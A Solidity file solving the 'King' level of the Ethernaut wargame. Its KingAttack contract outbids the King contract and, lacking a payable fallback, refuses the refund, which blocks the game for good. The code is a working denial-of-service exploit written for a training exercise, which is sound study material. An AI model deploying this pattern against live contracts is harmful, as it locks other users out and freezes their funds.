// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

/*
 * Used to solve level 9 (king) in Ethernaut. 
 * Also a simple problem, if you understand how receive & payable works. Send just
 * enough ethereum to the King contract, and then refuse to allow any to be sent
 * back (there is no payable fallback function). This breaks the game.
*/
contract KingAttack {
    constructor(address payable king) payable public {
        uint balance = higherBalance(king);
        require(
            msg.value == balance, 
            "Send higherBalance. No more, no less.");
        king.call{value: higherBalance(king)}("");
    }

    function higherBalance(address payable king) view public returns(uint) {
        return king.balance + 1;
    }
}
